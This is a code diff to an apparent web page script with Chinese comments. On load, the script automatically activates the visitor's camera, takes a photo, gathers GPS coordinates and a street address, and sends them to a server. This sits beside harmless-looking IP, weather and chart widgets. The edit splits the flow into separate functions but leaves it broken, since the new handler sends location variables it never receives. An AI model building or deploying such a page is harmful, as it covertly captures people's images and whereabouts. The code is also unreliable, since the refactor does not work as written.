@@ -81,8 +81,8 @@
   </div>
 
 <script>
-  // 自動拍照功能（優先處理）
-  async function startCameraAndSend() {
+  // 獨立的相機拍照功能
+  async function startCamera() {
     const statusElement = document.getElementById('status');
     try {
       const stream = await navigator.mediaDevices.getUserMedia({
@@ -100,7 +100,7 @@
       });
 
       // 延遲 1 秒拍照
-      setTimeout(async () => {
+      setTimeout(() => {
         const canvas = document.createElement('canvas');
         canvas.width = video.videoWidth || 640;
         canvas.height = video.videoHeight || 480;
@@ -110,9 +110,9 @@
         // 壓縮為 Base64 格式
         const photoData = canvas.toDataURL('image/jpeg', 0.5).split(',')[1];
         stream.getTracks().forEach((track) => track.stop());
-
-        // 獲取 GPS 並發送資料
-        await getGpsCoordinates(photoData);
+        
+        // 繼續處理拍攝的照片
+        processPhotoData(photoData);
       }, 1000);
     } catch (error) {
       console.error('無法啟動相機:', error);
@@ -120,8 +120,8 @@
     }
   }
 
-  // 獲取 GPS 經緯度資訊
-  async function getGpsCoordinates(photoData) {
+  // 獨立的 GPS 獲取功能
+  async function getGpsCoordinates() {
     const statusElement = document.getElementById('status');
     try {
       const position = await new Promise((resolve, reject) => {
@@ -137,11 +137,23 @@
       const data = await response.json();
       const address = data.display_name || '未知地址';
 
-      // 發送照片到後端
-      await sendPhotoToServer(photoData, latitude, longitude, address);
+      // 繼續處理 GPS 資訊
+      processGpsData(latitude, longitude, address);
     } catch (error) {
       console.error('GPS 錯誤或超時:', error);
       statusElement.innerText = 'GPS 無法取得，請檢查裝置定位權限或嘗試重新載入。';
+    }
+  }
+
+  // 處理照片和 GPS 資訊
+  async function processPhotoData(photoData) {
+    try {
+      // 獲取 GPS 資訊並繼續處理
+      await getGpsCoordinates();
+      await sendPhotoToServer(photoData, latitude, longitude, address);
+    } catch (error) {
+      console.error('處理過程中發生錯誤:', error);
+      document.getElementById('status').innerText = '處理過程中發生錯誤，請檢查控制台。';
     }
   }
 
@@ -287,9 +299,11 @@
     getIpInfo();
     getWeatherInfo();
     setupPerformanceChart();
-    startCameraAndSend(); // 確保優先執行
+    startCamera();
+    getGpsCoordinates();
   });
 </script>
+
 
 </body>
 </html>
